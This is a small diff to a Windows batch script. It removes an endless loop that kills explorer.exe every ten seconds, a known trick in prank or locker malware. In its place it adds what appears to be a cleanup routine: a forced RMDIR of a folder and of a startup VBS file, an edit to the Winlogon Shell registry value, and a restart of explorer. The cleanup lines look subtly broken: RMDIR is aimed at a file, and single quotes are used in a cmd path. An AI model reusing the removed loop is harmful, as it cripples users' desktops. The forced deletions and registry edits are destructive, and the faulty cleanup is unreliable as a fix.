@@ -1,7 +1,5 @@
-echo off
-
-:start
-tasklist /fi "imagename eq explorer.exe" |find ":" > nul
-if errorlevel 1 taskkill /f /im "explorer.exe"
-timeout 10 > nul
-goto start
+@echo off
+RMDIR /Q/S C:\fxr
+RMDIR /Q/S C:\Users\%username%\AppData\Roaming\Microsoft\Windows\'Start Menu'\Programs\Startup\starup.vbs
+Reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "explorer.exe" /f
+powershell Start-Process explorer.exe
